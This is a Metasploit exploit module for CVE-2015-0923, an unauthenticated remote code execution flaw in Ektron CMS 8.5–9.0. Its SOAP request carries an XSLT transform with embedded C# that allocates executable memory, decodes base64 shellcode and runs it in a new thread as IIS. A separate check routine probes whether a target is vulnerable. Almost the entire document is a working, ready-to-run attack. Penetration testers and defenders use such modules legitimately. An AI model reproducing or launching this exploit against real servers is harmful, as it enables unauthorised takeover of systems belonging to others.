# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{ Ektron 8.5, 8.7 <= sp1, 9.0 < sp1 have
vulnerabilities in various operations within the ServerControlWS.asmx
web services. These vulnerabilities allow for RCE without authentication and
execute in the context of IIS on the remote system.
      },
      &#039;Author&#039;         => [
        &#039;catatonicprime&#039;
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-0923&#039; ],
          [ &#039;US-CERT-VU&#039;, &#039;377644&#039; ],
          [ &#039;URL&#039;, &#039;http://www.websecuritywatch.com/xxe-arbitrary-code-execution-in-ektron-cms/&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;           => 2048,
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        =>
        [
          [&#039;Windows 2008 R2 / Ektron CMS400 8.5&#039;, { &#039;Arch&#039; => [ ARCH_X64, ARCH_X86 ] }]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Feb 05 2015&#039;
    ))

    register_options(
      [
        OptInt.new(&#039;HTTP_DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the VBS payload request&#039;, 60]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path of the Ektron CMS&#039;, &#039;/cms400min/&#039;]),
        OptEnum.new(&#039;TARGETOP&#039;,
          [
            true,
            &#039;The vulnerable web service operation to exploit&#039;,
            &#039;ContentBlockEx&#039;,
              [
                &#039;ContentBlockEx&#039;,
                &#039;GetBookmarkString&#039;,
                &#039;GetContentFlaggingString&#039;,
                &#039;GetContentRatingString&#039;,
                &#039;GetMessagingString&#039;
              ]
          ])
      ], self.class )
  end


  def vulnerable_param
    return &#039;Xslt&#039; if datastore[&#039;TARGETOP&#039;] == &#039;ContentBlockEx&#039;
    &#039;xslt&#039;
  end

  def required_params
    return &#039;&#039; if datastore[&#039;TARGETOP&#039;] == &#039;ContentBlockEx&#039;
    &#039;<showmode/>&#039;
  end

  def target_operation
    datastore[&#039;TARGETOP&#039;]
  end

  def prologue
    <<-XSLT
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <#{target_operation} xmlns="http://www.ektron.com/CMS400/Webservice">
      #{required_params}
      <#{vulnerable_param}>
        <![CDATA[
        <xsl:transform version="2.0"
          xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
          xmlns:msxsl="urn:schemas-microsoft-com:xslt"
          xmlns:user="http://mycompany.com/mynamespace">
XSLT
  end

  def epilogue
    <<-XSLT
          </msxsl:script>
          <xsl:template match="/">
            <xsl:value-of select="user:xml()"/>
          </xsl:template>
        </xsl:transform>
        ]]>
      </#{vulnerable_param}>
    </#{target_operation}>
  </soap:Body>
</soap:Envelope>
XSLT
  end

  def check

    fingerprint = rand_text_alpha(5 + rand(5))
    xslt_data = <<-XSLT
#{prologue}
            public string xml() {
              return "#{fingerprint}";
            }
#{epilogue}
XSLT

    res = send_request_cgi(
      {
        &#039;uri&#039;     => "#{uri_path}WorkArea/ServerControlWS.asmx",
        &#039;version&#039; => &#039;1.1&#039;,
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;ctype&#039;   => "text/xml; charset=UTF-8",
        &#039;headers&#039; => {
          "Referer" => build_referer
        },
        &#039;data&#039; =>  xslt_data
      })

    if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def uri_path
    uri_path = target_uri.path
    uri_path << "/" if uri_path[-1, 1] != "/"
    uri_path
  end

  def build_referer
    if datastore[&#039;SSL&#039;]
      schema = "https://"
    else
      schema = "http://"
    end

    referer = schema
    referer << rhost
    referer << ":#{rport}"
    referer << uri_path
    referer
  end

  def exploit

    print_status("Generating the EXE Payload and the XSLT...")
    fingerprint = rand_text_alpha(5 + rand(5))

    xslt_data = <<-XSLT
#{prologue}
            private static UInt32 MEM_COMMIT = 0x1000;
            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

            [System.Runtime.InteropServices.DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

            [System.Runtime.InteropServices.DllImport("kernel32")]
            private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

            public string xml()
            {
              string shellcode64 = @"#{Rex::Text.encode_base64(payload.encoded)}";
              byte[] shellcode = System.Convert.FromBase64String(shellcode64);
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              System.Runtime.InteropServices.Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
              IntPtr hThread = IntPtr.Zero;
              IntPtr pinfo = IntPtr.Zero;
              UInt32 threadId = 0;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              return "#{fingerprint}";
            }
#{epilogue}
XSLT

    print_status("Trying to run the xslt transformation...")
    res = send_request_cgi(
      {
        &#039;uri&#039;     => "#{uri_path}WorkArea/ServerControlWS.asmx",
        &#039;version&#039; => &#039;1.1&#039;,
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;ctype&#039;   => "text/xml; charset=UTF-8",
        &#039;headers&#039; => {
          "Referer" => build_referer
        },
        &#039;data&#039; => xslt_data
      })
    if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/
      print_good("Exploitation was successful")
    else
      fail_with(Failure::Unknown, "There was an unexpected response to the xslt transformation request")
    end

  end
end

